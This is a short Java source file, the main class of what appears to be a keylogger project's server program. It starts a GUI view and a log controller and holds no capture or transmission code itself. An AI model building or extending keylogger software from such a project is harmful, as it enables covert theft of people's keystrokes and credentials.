package com.hao.keylogger.program;

import com.hao.keylogger.controllers.server.ServerLogController;
import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ILookAndFeel;
import com.hao.keylogger.views.ServerView;

public class ServerKeyLoggerProgram implements ILookAndFeel{

	public ServerKeyLoggerProgram() {
	
	}

	public static void main(String[] args) {
		ILookAndFeel.setLookAndFeel();
		ServerView serverView = new ServerView();
		ServerLogController controller = new ServerLogController(serverView, new Log());		
	}
}
